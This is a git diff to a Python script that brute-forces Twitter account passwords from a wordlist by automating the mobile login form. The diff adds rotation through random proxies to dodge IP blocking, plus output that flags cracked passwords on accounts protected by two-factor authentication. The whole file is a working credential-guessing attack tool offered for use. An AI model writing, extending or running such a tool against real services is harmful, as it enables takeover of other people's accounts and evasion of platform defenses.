@@ -2,7 +2,8 @@ import mechanize
 import argparse
 import sys
 import os
-
+from proxylist import ProxyList
+import logging
 
 
 print('''\033[1;36m
@@ -43,10 +44,25 @@ b.addheaders = [('User-agent',
                  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101'
                  )]
 
-username = input('user:')
-passwordList = input('password:')
-
-
+username = input('\033[1;37muser : \033[1;37m')
+passwordList = input('\033[1;37mpassword : \033[1;37m')
+proxyList = input('\033[1;37mproxy : \033[1;37m')
+def proxy():
+    logging.basicConfig()
+    pl = ProxyList()
+    try:
+        pl.load_file(proxyList)
+    except:
+        sys.exit('[!] Proxy File format has incorrect | EXIT...')
+    pl.random()
+    getProxy = pl.random().address()
+    b.set_proxies(proxies={"https": getProxy})
+    try:
+        checkProxyIP = b.open("https://api.ipify.org/?format=raw", timeout=2)
+    except:
+        return proxy()
+        
+        
 def Twitter():
     password = open(passwordList).read().splitlines()
     try_login = 0
@@ -67,14 +83,20 @@ def Twitter():
             response = b.submit()
 
             if len(response.geturl()) == 27:
-                print(f'\n[+] Good ^_^ [{username}]:[{password}] [+]')
+                print(f'\n\033[1;31m [+] Good ^_^ [{username}]:[{password}] [+] \033[1;31m')
+                proxy()
                 break
+            elif response.geturl() == "https://mobile.twitter.com/login/check":
+                print(f'\n\033[1;31m [+] Good ^_^ [{username}]:[{password}] [+] --> But There is a 2FA \033[1;31m')
+                proxy()
             else:
-                print(' NO !')
+                print('\033[1;37m NO !\033[1;37m')
         except KeyboardInterrupt:
             print('\n ok exit ')
             sys.stdout.flush()
+            proxy()
             break
             
 if __name__ == '__main__':
     Twitter()
+    proxy()
